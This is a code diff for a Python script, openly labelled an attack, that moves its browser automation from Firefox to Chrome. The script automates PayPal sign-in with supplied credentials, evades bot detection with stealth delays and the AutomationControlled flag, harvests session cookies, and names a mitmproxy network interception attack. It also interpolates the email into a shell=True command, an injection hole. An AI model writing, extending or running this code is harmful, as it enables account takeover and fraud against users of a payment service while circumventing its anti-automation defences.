@@ -3,11 +3,11 @@ import random
 import requests
 import subprocess
 from selenium import webdriver
-from selenium.webdriver.firefox.service import Service as FirefoxService
-from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.chrome.service import Service as ChromeService
+from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
-from webdriver_manager.firefox import GeckoDriverManager
+from webdriver_manager.chrome import ChromeDriverManager
 from mitmproxy.tools.main import mitmweb
 from getpass import getpass
 
@@ -15,11 +15,12 @@ def stealth_delay():
     time.sleep(random.uniform(2, 5))
 
 def browser_automation_attack(email, password):
-    options = FirefoxOptions()
-    # Remove headless mode for debugging (enable it later for stealth)
-    # options.add_argument("--headless")
+    options = ChromeOptions()
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-blink-features=AutomationControlled")
     
-    driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()), options=options)
+    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
     driver.get("https://www.paypal.com/signin")
     stealth_delay()
     
@@ -40,18 +41,18 @@ def browser_automation_attack(email, password):
     stealth_delay()
     
     if "summary" in driver.current_url:
-        print("Login successful! Launching Firefox with session...")
+        print("Login successful! Launching Chrome with session...")
         cookies = driver.get_cookies()
         driver.quit()
-        launch_firefox_with_session(email, cookies)
+        launch_chrome_with_session(email, cookies)
     else:
         print("Login failed or 2FA required.")
         driver.quit()
 
-def launch_firefox_with_session(email, cookies):
-    firefox_command = f"firefox --new-tab 'https://www.paypal.com/signin?email={email}'"
-    subprocess.Popen(firefox_command, shell=True)
-    print("Firefox launched with PayPal session.")
+def launch_chrome_with_session(email, cookies):
+    chrome_command = f"google-chrome --new-tab 'https://www.paypal.com/signin?email={email}'"
+    subprocess.Popen(chrome_command, shell=True)
+    print("Chrome launched with PayPal session.")
 
 def network_interception_attack():
     print("Starting network interception attack...")
